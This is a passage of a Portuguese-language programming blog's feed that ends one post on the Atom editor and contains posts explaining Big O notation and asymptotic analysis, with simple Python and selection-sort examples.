&lt;p&gt;Acima, eu propositalmente desligo o &lt;code&gt;autopep8&lt;/code&gt; e &lt;code&gt;yapf&lt;/code&gt;, uma vez que para este
projeto eu estou utilizando &lt;a href="https://github.com/rupert/pyls-black" title="Black plugin for the Python Language Server"&gt;&lt;em&gt;Black&lt;/em&gt;&lt;/a&gt;. Já na chave &lt;code&gt;python&lt;/code&gt;, eu explicitamente digo qual instalação
do &lt;em&gt;Python&lt;/em&gt; pretendo utilizar.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Reforço a opinião do começo desse &lt;em&gt;post&lt;/em&gt;: Recomendo.&lt;/p&gt;
&lt;p&gt;É um editor muito amigável e confortável de usar. Os &lt;em&gt;key bidings&lt;/em&gt; do &lt;em&gt;Vim&lt;/em&gt; são
um &lt;em&gt;plus&lt;/em&gt;, e além disso a documentação para criação de &lt;em&gt;plugins&lt;/em&gt;
e configurações diversas é impressionante. O fato de não se render à componentização (IMO) é
outro fator positivo, assim como a riqueza de pacotes e a grande comunidade em sua volta.&lt;/p&gt;
&lt;p&gt;Mas se você é um &lt;em&gt;developer&lt;/em&gt; que gosta de seguir o &lt;em&gt;hype&lt;/em&gt;, eu diria que o &lt;em&gt;Visual
Studio Code&lt;/em&gt; é uma opção mais atraente. Na dúvida, teste os dois e nos conte suas
conclusões nos comentários abaixo.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.atom.io/2017/09/12/announcing-atom-ide.html"&gt;Atom: Introducing Atom-IDE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.atom.io/2018/12/12/facebook-retires-nuclide-extension.html"&gt;Atom: Facebook retires Nuclide extension&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://news.ycombinator.com/item?id=18507817"&gt;Hacker News: Is Atom now dead in the water?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.infoq.com/br/news/2018/12/the-rise-vscode"&gt;InfoQ: A crescente adoção do Visual Studio Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Atom_(text_editor)"&gt;Wikipedia: Atom (text editor)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="editores"></category><category term="ide"></category><category term="atom"></category><category term="python"></category><category term="vim"></category></entry><entry><title>Algoritmos: Como medir?</title><link href="https://klauslaube.com.br/2018/12/09/algoritmos-como-medir.html" rel="alternate"></link><published>2018-12-09T21:30:00-02:00</published><updated>2018-12-09T21:30:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-12-09:/2018/12/09/algoritmos-como-medir.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2018/11/09/analise-assintotica.html" title="Leia mais sobre Análise Assintótica"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
introduzimos o conceito de Análise Assintótica e falamos brevemente sobre
o &lt;em&gt;Big O Notation&lt;/em&gt;. Nesse &lt;em&gt;post&lt;/em&gt;, vamos pincelar sobre como mensurar um algoritmo
utilizando a notação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas antes de mais nada é preciso reforçar: O &lt;em&gt;Big O&lt;/em&gt; é apenas uma das métricas
(número de passos proporcional ao …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2018/11/09/analise-assintotica.html" title="Leia mais sobre Análise Assintótica"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
introduzimos o conceito de Análise Assintótica e falamos brevemente sobre
o &lt;em&gt;Big O Notation&lt;/em&gt;. Nesse &lt;em&gt;post&lt;/em&gt;, vamos pincelar sobre como mensurar um algoritmo
utilizando a notação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas antes de mais nada é preciso reforçar: O &lt;em&gt;Big O&lt;/em&gt; é apenas uma das métricas
(número de passos proporcional ao tamanho do seu &lt;em&gt;input&lt;/em&gt;) que pode te levar à
conclusão de que o seu algoritmo é eficiente ou não. Em momento de implementação,
outras métricas como memória, tempo, acesso a recursos e consumo de energia podem
impactar nesse resultado.&lt;/p&gt;
&lt;p&gt;Para tanto, é comum termos duas formas distintas de análise:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Empírica:&lt;/strong&gt; Tempo de execução do código, implementado na linguagem de programação de sua escolha.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Analítica:&lt;/strong&gt; Não leva em consideração o ambiente no qual o seu algoritmo irá executar, representando através de uma ordem de grandeza o tempo de execução do algoritmo.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Vamos focar no método analítico, claro. Se você está interessado no método
empírico, ferramentas de &lt;em&gt;profiling&lt;/em&gt; podem te dar ótimas dicas sobre a performance
da sua solução.&lt;/p&gt;
&lt;h2&gt;Tempo x Espaço&lt;/h2&gt;
&lt;p&gt;É possível utilizar o &lt;em&gt;Big O&lt;/em&gt; para medirmos quanto de espaço que um determinado
algoritmo ocupa. Na &lt;em&gt;Wikipedia&lt;/em&gt; existe inúmeros &lt;em&gt;wikis&lt;/em&gt; sobre algoritmos famosos,
e grande parte deles apresenta a seguinte estrutura:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/wikipedia-merge-sort.png" width="331" height="514" title="Exemplo de card do Wikipedia mostrando os tempos de um algoritmo (wikipedia)" alt="Exemplo de card do Wikipedia mostrando os tempos de um algoritmo (wikipedia)"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Merge sort&lt;/em&gt;, um dos mais famosos algoritmos de ordenação, além de ter
uma performance média de &lt;code&gt;O (n log n)&lt;/code&gt;, em seu pior cenário ocupa
&lt;code&gt;O(n)&lt;/code&gt; de espaço. Onde &lt;code&gt;n&lt;/code&gt; corresponde ao tamanho da entrada do algoritmo.
Logo, se você passar um &lt;em&gt;array&lt;/em&gt; de 10 posições para o &lt;em&gt;Merge sort&lt;/em&gt; ordenar,
ele ocupará outras 10 posições ao fim do processo.&lt;/p&gt;
&lt;p&gt;Em contrapartida, o &lt;em&gt;Bubble sort&lt;/em&gt;, também famoso mas nada performático
(&lt;code&gt;O(n²)&lt;/code&gt;), ocupa &lt;code&gt;O(1)&lt;/code&gt; (não necessitando de novas posições na memória
para fazer a ordenação).&lt;/p&gt;
&lt;p&gt;Se você estiver projetando a sua solução para um ambiente limitado,
será necessário levar em consideração o espaço, mas é muito comum nos tempos
atuais &lt;a href="https://klauslaube.com.br/2012/05/14/o-cache-e-o-http.html" title="O Cache e o HTTP"&gt;sacrificarmos memória em prol do tempo de execução&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Quanto mais próximo de linear, melhor&lt;/h2&gt;
&lt;p&gt;Voltando o foco ao tempo de execução, é possível categorizarmos um bom algoritmo
quando ele é o mais próximo possível de linear (se ele for sublinear ou constante,
melhor ainda). Ou seja:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Se ordernar &lt;strong&gt;10 items&lt;/strong&gt; leva &lt;strong&gt;1 milissegundo&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;Ordenar &lt;strong&gt;20 items&lt;/strong&gt; deveria levar &lt;strong&gt;2 milissegundos&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;E ordenar &lt;strong&gt;100 items&lt;/strong&gt; deveria levar &lt;strong&gt;10 milissegundos&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Esse comportamento é linear, resultando em &lt;code&gt;O(n)&lt;/code&gt;. Mas o comportamento abaixo
não é o dos melhores:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Se ordenar &lt;strong&gt;10 items&lt;/strong&gt; leva &lt;strong&gt;1 milissegundo&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;E ordenar &lt;strong&gt;20 items&lt;/strong&gt; leva &lt;strong&gt;4 milissegundos&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;E ordenar &lt;strong&gt;100 items&lt;/strong&gt; leva &lt;strong&gt;100 milissegundos&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;Temos uma progressão quadrática, resultando em &lt;code&gt;O(n²)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Algo não tão desejável em se tratando de algoritmos.&lt;/p&gt;
&lt;h2&gt;Mais um pouquinho de teoria&lt;/h2&gt;
&lt;p&gt;Vamos gastar um pouco de teoria aqui para definir &lt;em&gt;Big O&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Se um tempo de execução é O(f(n)), então para um n suficientemente grande,
o tempo de execução é no máximo k*f(n) para alguma constante k.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/big-o.png" width="359" height="215" title="f(n) e Big O (khanacademy.org)" alt="f(n) e Big O (khanacademy.org)"&gt;&lt;/p&gt;
&lt;p&gt;Dizemos que o tempo de execução é &lt;code&gt;big-O de f(n)&lt;/code&gt; ou só &lt;code&gt;O de f(n)&lt;/code&gt;. Com
isso informamos limites assintóticos superiores, ou seja, que no pior cenário
o tempo de execução cresce de uma maneira até atingir determinado limite, mas
poderia crescer mais devagar. Não podemos desconsiderar que o &lt;em&gt;input&lt;/em&gt; tem que ser
suficientemente grande (repare na linha pontilhada). Não é incomum vermos
algoritmos que performem em &lt;code&gt;O(n log n)&lt;/code&gt; tendo um desempenho ruim com um
conjunto de dados pequeno.&lt;/p&gt;
&lt;h2&gt;Agora sim! Vamos contar&lt;/h2&gt;
&lt;h3&gt;Complexidade constante: O(1)&lt;/h3&gt;
&lt;p&gt;Queremos calcular qual é a complexidade de um algoritmo de troca de valores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;swap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;num2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;temp_num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;num1&lt;/span&gt;
    &lt;span class="n"&gt;num1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;num2&lt;/span&gt;
    &lt;span class="n"&gt;num2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;temp_num&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos, em teoria, contar cada atribuição de valor executada pelo algoritmo
como um “passo”. Teríamos &lt;code&gt;complexidade = 3&lt;/code&gt;, e esse resultado nunca mudará,
não importa qual valor que passe de entrada. Logo, é possível dizer que a
complexidade desse algoritmo é constante, representada por &lt;code&gt;O(1)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/social-network-algorithm.jpg" width="640" height="360" title="Em um piscar de olhos, você estará rabiscando algoritmos nas janelas da sua casa (blogossus.com)" alt="Em um piscar de olhos, você estará rabiscando algoritmos nas janelas da sua casa (blogossus.com)"&gt;&lt;/p&gt;
&lt;p&gt;Pode parecer confuso não utilizar &lt;code&gt;O(3)&lt;/code&gt;, mas seguindo a definição matemática
apresentada anteriormente, quando eu assumo que meu algoritmo tem
complexidade &lt;code&gt;O(1)&lt;/code&gt;, estou dizendo que o seu limite assintótico superior é menor
ou igual a &lt;code&gt;k * f(n)&lt;/code&gt;. Se considerarmos o &lt;code&gt;k&lt;/code&gt; como constante representando a
quantidade de atribuições do nosso algoritmo &lt;code&gt;(3)&lt;/code&gt; e &lt;code&gt;f(n)&lt;/code&gt; como o
&lt;em&gt;running time&lt;/em&gt; &lt;code&gt;(1)&lt;/code&gt;, temos como &lt;em&gt;upper bound&lt;/em&gt; o valor &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Em outras palavras: Se o tempo de execução do seu algoritmo é constante, a
maneira ideal de representá-lo é através de &lt;code&gt;O(1)&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Complexidade linear: O(n)&lt;/h3&gt;
&lt;p&gt;Quando a entrada do algoritmo é variável em tamanho, temos um comportamento
diferente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;soma&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;total&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Geralmente quando temos algum loop, e ele está ligado ao &lt;em&gt;input&lt;/em&gt;, dificilmente
chegamos a um algoritmo de complexidade constante. No caso acima, podemos contar
os passos da seguinte forma:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;n = tamanho(array)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;total = 0&lt;/code&gt;: 1 operação&lt;/li&gt;
&lt;li&gt;&lt;code&gt;atribuição de valor a num&lt;/code&gt;: n operações&lt;/li&gt;
&lt;li&gt;&lt;code&gt;total = total + num&lt;/code&gt;: n * 2 operações&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para cada elemento do &lt;em&gt;array&lt;/em&gt;, executaremos uma soma &lt;code&gt;(total + num)&lt;/code&gt; e uma
atribuição &lt;code&gt;(total = &amp;lt;resultado&amp;gt;)&lt;/code&gt;. Chegamos à conclusão que
&lt;code&gt;complexidade = 1 + (n * 2)&lt;/code&gt;. Mas como chegamos a &lt;code&gt;O(n)&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;Deixando a parte matemática de lado, quando trata-se de análise assintótica,
estamos mais interessados no que realmente interfere na performance do
algoritmo. Ou seja, os valores constantes &lt;code&gt;(1 e 2)&lt;/code&gt; nessa análise são detalhes
se comparados ao impacto que &lt;code&gt;n&lt;/code&gt; causa ao tempo de execução. Portanto, uma das
maneiras de encarar a mensuração do &lt;em&gt;Big O&lt;/em&gt; é simplesmente ignorando as
constantes e focando no que é dinâmico, nos levando a &lt;code&gt;complexidade = n&lt;/code&gt; e em
consequência ao &lt;code&gt;O(n)&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;E como num passe de mágica, depois de certa intimidade com o &lt;em&gt;Big O Notation&lt;/em&gt;,
você passa a assumir a complexidade de um algoritmo com uma breve “olhadela”.
Ao ver um &lt;em&gt;loop&lt;/em&gt; assume que é &lt;code&gt;n&lt;/code&gt;, ao ver &lt;em&gt;loop&lt;/em&gt; dentro de &lt;em&gt;loop&lt;/em&gt;, que é &lt;code&gt;n²&lt;/code&gt;,
e assim por diante…&lt;/p&gt;
&lt;p&gt;Nos próximos &lt;em&gt;posts&lt;/em&gt; vamos explorar algoritmos de diferentes complexidades,
entrando em detalhes para entender os seus tempos de execução e alternativas
otimizadas.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;p&gt;Esse &lt;em&gt;post&lt;/em&gt; foi originalmente escrito para o &lt;a href="https://www.profissionaisti.com.br/2017/10/analise-de-algoritmos-como-medir/" title="Leia mais no Profissionais TI"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pt.khanacademy.org/computing/computer-science/algorithms/asymptotic-notation/a/big-o-notation"&gt;Khan Academy: Notação Big-O&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/3255/big-o-how-do-you-calculate-approximate-it"&gt;Stackoverflow: Big O, how do you calculate/approximate it?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.stackoverflow.com/questions/33319/o-que-%C3%A9-a-complexidade-de-um-algoritmo"&gt;Stackoverflow: O que é complexidade de um algoritmo?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.udemy.com/complexity-theory-basics/"&gt;Udemy: Complexity Theory Basics&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="estrutura-de-dados"></category><category term="algoritmos"></category></entry><entry><title>Análise assintótica</title><link href="https://klauslaube.com.br/2018/11/09/analise-assintotica.html" rel="alternate"></link><published>2018-11-09T16:34:00-02:00</published><updated>2018-11-09T16:34:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-11-09:/2018/11/09/analise-assintotica.html</id><summary type="html">&lt;p&gt;Devo confessar que durante a minha graduação, nunca prestei muita atenção na
parte mais “teórica” da computação. O que eu queria era sentar e “codar”,
sem realmente me preocupar com algoritmos, estruturas de dados, ou com os
impactos que a minha solução ocasionaria em um determinado ambiente.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Com a idade …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Devo confessar que durante a minha graduação, nunca prestei muita atenção na
parte mais “teórica” da computação. O que eu queria era sentar e “codar”,
sem realmente me preocupar com algoritmos, estruturas de dados, ou com os
impactos que a minha solução ocasionaria em um determinado ambiente.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Com a idade vem a experiência, e com a experiência vem a necessidade de
estressar diferentes pontos de vista antes de adotar solução X ou Y. Foi
a partir dessa necessidade que fui obrigado a revisitar alguns conceitos
básicos da Ciência da Computação, e fatalmente me senti motivado a compilar
esse conhecimento em uma série de artigos.&lt;/p&gt;
&lt;p&gt;Se você, assim como eu, deu aquela dormida nas aulas de Teoria da Complexidade
Computacional, junte-se a mim e vamos relembrar esses conceitos juntos.&lt;/p&gt;
&lt;h2&gt;Algoritmos e tempos de execução&lt;/h2&gt;
&lt;p&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;, um &lt;a href="https://pt.wikipedia.org/wiki/Algoritmo" title="Leia mais sobre no Wikipedia"&gt;Algoritmo&lt;/a&gt; é:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(…) uma sequência finita de instruções bem definidas e não ambíguas,
cada uma das quais devendo ser executadas mecânica ou eletronicamente
em um intervalo de tempo finito e com uma quantidade de esforço finita.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A sua aplicação pode ser composta por uma porção de algoritmos, cada um
destinado a um fim muito específico. Por exemplo, você pode ter um algoritmo
responsável por encontrar todos os pedidos vendidos no último mês, que contenham
um determinado produto. Com o advento do Big Data, inúmeros algoritmos são
postos em prática para mineração e análise de dados, então, mesmo que exista
uma aplicação ou serviço resolvendo esses problemas para você, acredite...
os algoritmos estarão lá.&lt;/p&gt;
&lt;p&gt;Um determinado algoritmo pode ter tempos de execução relativamente diferentes
de acordo com o ambiente no qual ele esteja rodando. Se for num computador
&lt;em&gt;Core i7&lt;/em&gt; e &lt;em&gt;16GB&lt;/em&gt; de &lt;em&gt;RAM&lt;/em&gt;, é possível assumirmos que ele rodará consideravelmente
melhor do que se estivesse operando em um &lt;em&gt;Raspberry Pi&lt;/em&gt;, por exemplo. Ainda há um
segundo cenário onde, talvez você tenha escrito o algoritmo perfeito em
&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; ou &lt;em&gt;Ruby&lt;/em&gt;, mas ele corre o risco de
executar de forma mais lenta que um algoritmo em &lt;em&gt;Assembly&lt;/em&gt; ou &lt;em&gt;C&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Partindo da premissa que um bom algoritmo é um conjunto de operações que resolvem
um problema em tempo e esforço atrativos, como podemos classificar se um algoritmo
é “rápido” ou não?&lt;/p&gt;
&lt;p&gt;É aí que entra a análise assintótica.&lt;/p&gt;
&lt;h2&gt;A Análise Assintótica&lt;/h2&gt;
&lt;p&gt;Segundo o &lt;em&gt;Wikibooks&lt;/em&gt;, a &lt;a href="https://en.wikibooks.org/wiki/Data_Structures/Asymptotic_Notation" title="Leia mais sobre no Wikibooks"&gt;análise assintótica&lt;/a&gt; é:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(…) a way of expressing the main component of the cost of an algorithm,
using idealized (not comparable) units of computational work.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em termos mais práticos, é uma forma de julgarmos se o nosso algoritmo é
eficiente, independente dos “recursos que o cercam” (como velocidade de
processamento, quantidade de memória, latência de rede, etc).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/matrix-view.gif" width="497" height="377" title="Análise assintótica é ver o algoritmo além do código, como o Neo em The Matrix (scifi.stackexchange.com)" alt="Análise assintótica é ver o algoritmo além do código, como o Neo em The Matrix (scifi.stackexchange.com)"&gt;&lt;/p&gt;
&lt;p&gt;Removendo todas as variáveis que podem influenciar no tempo de execução,
focamos nossas atenções em como o algoritmo está escrito, em qual é a sua
entrada, e se “ele por si” é a maneira mais eficiente para a resolução de
um determinado problema.&lt;/p&gt;
&lt;p&gt;Vale reforçar que a entrada é um fator de extrema importância no que tange
a análise assintótica. A análise é “input bound”, ou seja, a entrada
influenciará diretamente no resultado do estudo. Por exemplo, quando
ordenamos um vetor de tamanho &lt;code&gt;n&lt;/code&gt;, utilizando o algoritmo &lt;em&gt;Selection Sort&lt;/em&gt;,
teremos um tempo de execução de &lt;code&gt;n²&lt;/code&gt; (já que o algoritmo pega um número,
e compara com os demais números no vetor, repetindo essa operação até chegar
ao fim do dado estruturado).&lt;/p&gt;
&lt;p&gt;Ao fim da análise, podemos chegar a 2 conclusões diferentes: Melhor cenário
e pior cenário.&lt;/p&gt;
&lt;h2&gt;Big O, Big Omega e Big Theta&lt;/h2&gt;
&lt;p&gt;Quem trabalha com desenvolvimento (ou até mesmo com computação num geral),
já deve ter ouvido falar sobre o famigerado &lt;em&gt;Big O Notation&lt;/em&gt;. Ele é uma notação
assintótica muito famosa na análise de tempos de execução de algoritmos. O que
pode ser uma surpresa é que ele não é a única notação que temos disponível:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;O(n)&lt;/strong&gt;: Expressa o limite superior do tempo de execução de um algoritmo (pior cenário);&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ω(n)&lt;/strong&gt;: Expressa o limite inferior do tempo de execução de um algoritmo (melhor cenário);&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Θ(n)&lt;/strong&gt;: Expressa limite superior e inferior do tempo de execução de um algoritmo (pior e melhor cenário).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Além da expressão linear, temos outras notações que descrevem diferentes tempos
de execução:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;O(1)&lt;/strong&gt;: Constante&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O(log n)&lt;/strong&gt;: Logarítmica&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O(n)&lt;/strong&gt;: Linear&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O(n log n)&lt;/strong&gt;: “Linearithmic” (maior que linear, menor que quadrática)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O(n²)&lt;/strong&gt;: Quadrática&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O(n³)&lt;/strong&gt;: Cúbica&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;n&lt;sup&gt;O(1)&lt;/sup&gt;&lt;/strong&gt;: Polinomial&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2&lt;sup&gt;O(n)&lt;/sup&gt;&lt;/strong&gt;: Exponencial&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De maneira simplista, &lt;code&gt;n&lt;/code&gt; pode ser considerado como o número de operações que o
algoritmo leva para chegar ao seu final. &lt;code&gt;n&lt;/code&gt; está intimamente ligado com a entrada
do seu algoritmo, onde quanto maior for o seu número, maior será o seu tempo de
execução.&lt;/p&gt;
&lt;p&gt;E como fazemos para contar o número de operações realizadas por um algoritmo?&lt;/p&gt;
&lt;h2&gt;Um pouquinho de prática&lt;/h2&gt;
&lt;p&gt;Voltando a citar o &lt;em&gt;Selection Sort&lt;/em&gt;, que trata-se de um “greedy algorithm” para
ordenação de números em um vetor, temos a seguinte sequencia de operações:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="nv"&gt;from&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;n&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; {
    &lt;span class="nv"&gt;Encontre&lt;/span&gt; &lt;span class="nv"&gt;um&lt;/span&gt; &lt;span class="nv"&gt;elemento&lt;/span&gt; &lt;span class="nv"&gt;menor&lt;/span&gt; &lt;span class="nv"&gt;que&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;é&lt;span class="nv"&gt;sima&lt;/span&gt; &lt;span class="nv"&gt;posi&lt;/span&gt;çã&lt;span class="nv"&gt;o&lt;/span&gt;, &lt;span class="nv"&gt;entre&lt;/span&gt; &lt;span class="nv"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;n&lt;/span&gt; &lt;span class="nv"&gt;entradas&lt;/span&gt;.
    &lt;span class="nv"&gt;Troque&lt;/span&gt; &lt;span class="nv"&gt;o&lt;/span&gt; &lt;span class="nv"&gt;elemento&lt;/span&gt; &lt;span class="nv"&gt;encontrado&lt;/span&gt; &lt;span class="nv"&gt;com&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;é&lt;span class="nv"&gt;sima&lt;/span&gt; &lt;span class="nv"&gt;entrada&lt;/span&gt;.
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Fazendo um pequeno &lt;a href="http://pt.slideshare.net/henriquecarmona/aula-4-teste-de-mesa" title="Veja mais no Slideshare"&gt;teste de mesa&lt;/a&gt;,
com o vetor (9, 2, 5, 7, 4, 8), temos o seguinte conjunto de procedimentos:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;[9, 2, 5, 7, 4, 8]&lt;/code&gt;:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i=1&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Encontre o menor número entre posições 1 e 6;&lt;/li&gt;
&lt;li&gt;Troque &lt;code&gt;array[i]&lt;/code&gt; com &lt;code&gt;array[2]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[2, 9, 5, 7, 4, 8]&lt;/code&gt;:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i=2&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Encontre o menor número entre posições 2 e 6;&lt;/li&gt;
&lt;li&gt;Troque &lt;code&gt;array[i]&lt;/code&gt; com &lt;code&gt;array[5]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[2, 4, 5, 7, 9, 8]&lt;/code&gt;:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i=3&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Encontre o menor número entre posições 3 e 6;&lt;/li&gt;
&lt;li&gt;Troque &lt;code&gt;array[i]&lt;/code&gt; com &lt;code&gt;array[3]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[2, 4, 5, 7, 9, 8]&lt;/code&gt;:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i=4&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Encontre o menor número entre posições 4 e 6;&lt;/li&gt;
&lt;li&gt;Troque &lt;code&gt;array[i]&lt;/code&gt; com &lt;code&gt;array[4]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[2, 4, 5, 7, 9, 8]&lt;/code&gt;:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i=5&lt;/code&gt;;&lt;/li&gt;
